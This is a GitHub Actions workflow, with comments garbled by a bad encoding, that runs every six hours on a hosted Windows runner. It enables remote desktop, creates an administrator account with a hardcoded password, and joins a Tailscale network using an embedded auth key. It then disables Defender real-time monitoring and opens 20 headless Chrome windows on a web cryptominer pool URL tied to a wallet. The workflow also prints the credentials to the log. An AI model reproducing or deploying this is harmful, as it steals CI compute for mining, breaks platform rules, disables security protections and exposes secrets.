name: RDP Auto-Recreate with Miner

on:
  workflow_dispatch:
  schedule:
    - cron: "0 */6 * * *"  # ŸÉŸÑ 6 ÿ≥ÿßÿπÿßÿ™ ÿ™ŸÇÿ±Ÿäÿ®Ÿãÿß

env:
  RDP_USER: "RDPUser"
  RDP_PASSWORD: "DefaultPass!234"  # ÿßÿ≥ÿ™ÿÆÿØŸÖ secret ÿ•ÿ∞ÿß ÿ£ÿ±ÿØÿ™
  MAX_RUNTIME: 340    # 5h40m
  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=20"

jobs:
  rdp-miner:
    runs-on: windows-latest
    timeout-minutes: 360  # GitHub limit

    steps:
      - name: Enable RDP
        run: |
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "MaxInstanceCount" -Value 2
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxMonitors" -Value 4
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxXResolution" -Value 3840
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxYResolution" -Value 2160

      - name: Create RDP User
        run: |
          $secure = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
          if (-not (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue)) {
              New-LocalUser -Name $env:RDP_USER -Password $secure -AccountNeverExpires
              Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
              Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
          } else {
              Set-LocalUser -Name $env:RDP_USER -Password $secure
          }

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
          $installer = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest $tsUrl -OutFile $installer
          Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait
          Remove-Item $installer

      - name: Validate Tailscale Auth Key
        run: |
          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
          Write-Host "Checking Tailscale Auth Key..."
          $try = 0
          $maxRetries = 3
          $success = $false
          while ($try -lt $maxRetries -and -not $success) {
              try {
                  & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" --hostname "GH-RDP-${env:GITHUB_RUN_ID}" --reset
                  $ip = & $tsExe ip -4
                  if ($ip) {
                      Write-Host "‚úÖ Tailscale connected, IP: $ip"
                      $success = $true
                      echo "TS_IP=$ip" >> $env:GITHUB_ENV
                  } else {
                      throw "No IP assigned"
                  }
              } catch {
                  Write-Host "‚ö†Ô∏è Tailscale login failed, retrying..."
                  Start-Sleep -Seconds 10
                  $try++
              }
          }
          if (-not $success) { throw "‚ùå Tailscale Auth Key invalid or cannot connect." }

      - name: Optimize Windows
        run: |
          powercfg /change standby-timeout-ac 0
          powercfg /change hibernate-timeout-ac 0
          powercfg /change monitor-timeout-ac 0
          powercfg /setactive SCHEME_MIN
          Set-MpPreference -DisableRealtimeMonitoring $true

      - name: Launch Headless Miner (20 windows, auto-restart)
        run: |
          $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
          if (-not (Test-Path $chromePath)) {
              Write-Host "Installing Chrome..."
              choco install googlechrome -y
          }

          $script = {
              param($url)
              while ($true) {
                  Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" `
                    "--headless --disable-gpu --no-sandbox --remote-debugging-port=9222 --app=$url"
                  Start-Sleep -Seconds 10
              }
          }

          for ($i=1; $i -le 20; $i++) {
              Start-Job -ScriptBlock $script -ArgumentList $env:MINER_URL
          }

      - name: Display RDP Info
        run: |
          Write-Host "==========================="
          Write-Host "üöÄ RDP READY"
          Write-Host "IP: $env:TS_IP"
          Write-Host "User: $env:RDP_USER"
          Write-Host "Pass: $env:RDP_PASSWORD"
          Write-Host "Duration: $env:MAX_RUNTIME min"
          Write-Host "==========================="

      - name: Keep Session Alive
        run: |
          $elapsed = 0
          while ($elapsed -lt $env:MAX_RUNTIME) {
              Write-Host "‚è± RDP + Miner active: $elapsed / $env:MAX_RUNTIME min"
              Start-Sleep -Seconds 60
              $elapsed++
          }

      - name: Cleanup
        if: always()
        run: |
          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
          & $tsExe logout
          Get-Job | Stop-Job | Remove-Job
          Write-Host "‚úÖ Cleanup completed"
